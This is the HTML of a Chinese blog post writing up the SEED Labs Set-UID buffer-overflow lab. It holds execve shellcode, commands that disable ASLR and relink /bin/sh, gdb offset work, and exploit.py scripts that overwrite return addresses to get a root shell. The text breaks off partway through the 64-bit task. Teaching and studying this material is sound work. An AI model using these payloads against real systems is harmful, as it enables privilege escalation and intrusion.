@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境准备安装好提供的环境，然后执行如下操作： sudo sysctl -w kernel.randomize_va_space&#x3D;0 # 关闭地址随机化sudo ln -sf &#x2F;bin&#x2F;zsh &#x2F;bin&#x2F;sh # 将有安全机制的 sh 链接到没有安全机制 zsh  StackGuard and Non-Executable Stack Getting Familiar with ShellcodeC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer-Overflow-Attack-Lab(Set-UID-Version)">
+<meta property="og:url" content="https://ceyewan.github.io/p/245267c1.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="环境准备安装好提供的环境，然后执行如下操作： sudo sysctl -w kernel.randomize_va_space&#x3D;0 # 关闭地址随机化sudo ln -sf &#x2F;bin&#x2F;zsh &#x2F;bin&#x2F;sh # 将有安全机制的 sh 链接到没有安全机制 zsh  StackGuard and Non-Executable Stack Getting Familiar with ShellcodeC">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107191054609.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107194740540.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107224553348.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109231459697.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/2022-11-13_16-23.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232111827.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232616406.png">
+<meta property="article:published_time" content="2022-11-10T14:16:40.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.275Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="Buffer-Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107191054609.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Buffer-Overflow-Attack-Lab(Set-UID-Version)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/b0280669.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/826ab436.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/245267c1.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/245267c1.html&text=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/245267c1.html&is_video=false&description=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buffer-Overflow-Attack-Lab(Set-UID-Version)&body=Check out this article: https://ceyewan.github.io/p/245267c1.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/245267c1.html&name=Buffer-Overflow-Attack-Lab(Set-UID-Version)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/245267c1.html&t=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-Familiar-with-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Getting Familiar with Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-Invoking-the-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Task: Invoking the Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Understanding-the-Vulnerable-Program"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Understanding the Vulnerable Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Launching-Attack-on-32-bit-Program-Level-1"><span class="toc-number">5.</span> <span class="toc-text">Launching Attack on 32-bit Program (Level 1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><span class="toc-number">6.</span> <span class="toc-text">Task 4: Launching Attack without Knowing Buffer Size (Level 2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3"><span class="toc-number">7.</span> <span class="toc-text">Task 5: Launching Attack on 64-bit Program (Level 3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Launching-Attack-on-64-bit-Program-Level-4"><span class="toc-number">8.</span> <span class="toc-text">Task 6: Launching Attack on 64-bit Program (Level 4)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-7-Defeating-dash%E2%80%99s-Countermeasure"><span class="toc-number">9.</span> <span class="toc-text">Tasks 7: Defeating dash’s Countermeasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-8-Defeating-Address-Randomization"><span class="toc-number">10.</span> <span class="toc-text">Task 8: Defeating Address Randomization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-9-Experimenting-with-Other-Countermeasures"><span class="toc-number">11.</span> <span class="toc-text">Tasks 9: Experimenting with Other Countermeasures</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Buffer-Overflow-Attack-Lab(Set-UID-Version)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-10T14:16:40.000Z" class="dt-published" itemprop="datePublished">2022-11-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Buffer-Overflow/" rel="tag">Buffer-Overflow</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>安装好提供的环境，然后执行如下操作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0 <span class="comment"># 关闭地址随机化</span></span><br><span class="line">sudo <span class="built_in">ln</span> -sf /bin/zsh /bin/sh <span class="comment"># 将有安全机制的 sh 链接到没有安全机制 zsh</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>StackGuard and Non-Executable Stack</strong></p>
+<h2 id="Getting-Familiar-with-Shellcode"><a href="#Getting-Familiar-with-Shellcode" class="headerlink" title="Getting Familiar with Shellcode"></a>Getting Familiar with Shellcode</h2><p>C 语言版的 <code>shellcode</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">	name[<span class="number">0</span>] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">	name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们不能够拿这个代码编译生成的二进制就当作了 <code>shellcode</code>。</p>
+<p>32 位的汇编版</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Store the command on stack</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp ; ebx --&gt; &quot;/bin//sh&quot;: execve()’s 1st argument</span><br><span class="line">; Construct the argument array argv[]</span><br><span class="line">push eax ; argv[1] = 0</span><br><span class="line">push ebx ; argv[0] --&gt; &quot;/bin//sh&quot;</span><br><span class="line">mov ecx, esp ; ecx --&gt; argv[]: execve()’s 2nd argument</span><br><span class="line">; For environment variable</span><br><span class="line">xor edx, edx ; edx = 0: execve()’s 3rd argument</span><br><span class="line">; Invoke execve()</span><br><span class="line">xor eax, eax ;</span><br><span class="line">mov al, 0x0b ; execve()’s system call number</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>64 位的汇编版</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdx, rdx ; rdx = 0: execve()’s 3rd argument</span><br><span class="line">push rdx</span><br><span class="line">mov rax, ’/bin//sh’ ; the command we want to run</span><br><span class="line">push rax ;</span><br><span class="line">mov rdi, rsp ; rdi --&gt; &quot;/bin//sh&quot;: execve()’s 1st argument</span><br><span class="line">push rdx ; argv[1] = 0</span><br><span class="line">push rdi ; argv[0] --&gt; &quot;/bin//sh&quot;</span><br><span class="line">mov rsi, rsp ; rsi --&gt; argv[]: execve()’s 2nd argument</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 0x3b ; execve()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Binary code for setuid(0) </span></span><br><span class="line"><span class="comment">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> code[<span class="number">500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strcpy</span>(code, shellcode);</span><br><span class="line">   <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())code;</span><br><span class="line"></span><br><span class="line">   func();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们得到两个版本的 <code>shellcode</code>（<code>shellcode</code> 如何编写不是这个实验的重点），这个程序就是将这段 <code>shellcode</code> 当作代码段运行。</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all: </span></span><br><span class="line">	gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">	gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line"></span><br><span class="line"><span class="section">setuid:</span></span><br><span class="line">	gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">	gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">	sudo chown root a32.out a64.out</span><br><span class="line">	sudo chmod 4755 a32.out a64.out</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f a32.out a64.out *.o</span><br></pre></td></tr></table></figure>
+
+<p><code>-m32</code> 表示编译生成 32 位程序，<code>-z execstack</code> 表示运行代码在栈上运行。执行 <code>make setuid</code> 命令后我们可以得到两个可执行程序。分别执行之：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107191054609.png" alt="image-20221107191054609"></p>
+<p>可以看到，我们拿到了 <code>root</code> 权限的 <code>shell</code> 进程。</p>
+<h2 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h2><p>我们要攻击的代码总体如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The following statement has a buffer overflow problem </span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);       </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dummy_function</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> dummy_buffer[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dummy_buffer, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">    bof(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main 函数在调用 <code>bof</code> 还调用了 <code>dummy_function</code>，我认为最主要的作用就是为 <code>bof</code> 和 <code>main</code> 之间留出足够的可插入 <code>shellcode</code> 的空间。</p>
+<p>我们将代码编译生成 <code>L1</code> 到 <code>L4</code> 这 4 个版本，前两个版本是 32 位，后两个版本是 64 位，并且每个版本都有普通版和 <code>debug</code> 版。再将普通版设为 <code>Setuid</code> 程序。其中 <code>L1</code> 的 <code>BUF_SIZE</code> 是 100，<code>L2</code> 的 <code>BUF_SIZE</code> 是 100 到 200 之间，<code>L3</code> 的 <code>BUF_SIZE</code> 是 200，<code>L4</code> 的 <code>BUF_SIZE</code> 是 10。</p>
+<h2 id="Launching-Attack-on-32-bit-Program-Level-1"><a href="#Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Launching Attack on 32-bit Program (Level 1)"></a>Launching Attack on 32-bit Program (Level 1)</h2><p>我们首先调试 <code>stack-L1-dbg</code> 得到一些数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p &amp;buffer</span><br><span class="line">$1 = (char (*)[100]) 0xffffcaec</span><br><span class="line">gdb-peda$ p $ebp</span><br><span class="line">$2 = (void *) 0xffffcb58</span><br><span class="line">gdb-peda$ p/d 0xffffcb58 - 0xffffcaec</span><br><span class="line">$3 = 108</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到 <code>$ebp=0xffffcb58</code>，这也就说明返回地址存储在 <code>0xffffcb5c</code> 这个位置，相对于 &amp;buffer 偏移了 108 + 4 也就是 112 这个位置。我们需要将这个位置修改，改成我们希望跳转执行的位置。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">   <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">300</span>    <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffcaec</span> + start <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">112</span>    	        <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>我们把上面 32 位的 <code>shellcode</code> 复制过来，然后 <code>ret</code> 就是要返回跳转的位置，我们设为 <code>0xffffcaec + start</code> 也就是 <code>&amp;buffer</code> 偏移 <code>start</code> 的位置，我们希望代码从 <code>&amp;buffer</code> 开始执行。并且把 <code>shellcode</code> 插入到 <code>&amp;buffer</code> 偏移 <code>start</code> 的位置（<code>content</code> 会被复制到 <code>buffer</code>）。</p>
+<p>下面依次是 <code>start</code> &#x3D; 0，200，300，400 的结果：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107194740540.png" alt="image-20221107194740540"></p>
+<p>等于 0 表示我们把 <code>shellcode</code> 放在 <code>bof</code> 函数栈内，可能是在函数退出之后，栈空间会被回收，因此导致了错误。等于 200 出现问题我感觉到匪夷所思。我调试了一下，在 <code>debug</code> 模式下可以工作，因此可能是普通模式没有 <code>gdb</code> 信息时这个地址在两个栈中间，影响到了重要的硬件指令。后面两个已经到 <code>dummy_function</code> 栈内了，因此可以正常工作。</p>
+<h2 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h2><p>在这个任务下，我们不知道 <code>buffer</code> 的大小，只知道是 100 到 200。但是，我们还是可以使用 <code>gdb</code> 得到 <code>&amp;buffer</code> 的地址，只是不能得到 <code>$ebp</code> 的地址罢了。我们先把 <code>ret</code> 的值修改为 <code>&amp;buffer</code>，然后把函数每个可能的 <code>ret</code> 位置都修改为我们的 <code>ret</code>，并且将 <code>start</code> 设为 400 或者 <code>517 - len(shellcode)</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">288</span>, L):</span><br><span class="line">   content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>根据我的测试，第二个数最大就是 288 了，292 就会抛出错误，可能是把某个重要指令被无意义数据给覆盖了。</p>
+<h2 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h2><p>64 位地址长这个样，<code>0x00007FFFFFFFFFFF</code> 也就是地址中有 0，在执行 <code>strcpy(buffer, str);</code> 的时候遇到 0 就停止了， 0 后面的内容不会被拷贝。这也就意味着 <code>shellcode</code> 不能放在 <code>ret</code> 的后面，只能放在 <code>ret</code> 的前面。并且地址还是小端序，<code>ret</code> 的低位非 0 会先拷贝，高位 0 不拷贝，但是之前的地址高位也是 0，所以没关系。</p>
+<p>使用 GDB 调试得到数据如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p $rbp</span><br><span class="line">$4 = (void *) 0x7fffffffd9c0</span><br><span class="line">gdb-peda$ p &amp;buffer</span><br><span class="line">$5 = (char (*)[200]) 0x7fffffffd8f0</span><br><span class="line">gdb-peda$ p/d 0x7fffffffd9c0 - 0x7fffffffd8f0</span><br><span class="line">$7 = 208</span><br></pre></td></tr></table></figure>
+
+<p>我们需要在修改 <code>exploit.py</code> 如下，将 <code>shellcode</code> 修改为 64 位的，然后将 <code>start</code> 设为 0（把 <code>shellcode</code> 放在 ret 前面），然后把 <code>ret</code> 的值设为 <code>&amp;buffer</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">   <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">   <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>    <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffd8f0</span> + start                         <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">216</span>    <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>    <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下，折磨一天了，我是没什么办法了：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107224553348.png" alt="image-20221107224553348"></p>
+<p>今天看到一个博主的文章，发现他填的参数很奇怪，又试了一次，诶嘿，居然通过了（使用的参数为 start &#x3D; 96， ret &#x3D; 0x7fffffffd850 + 160）：</p>
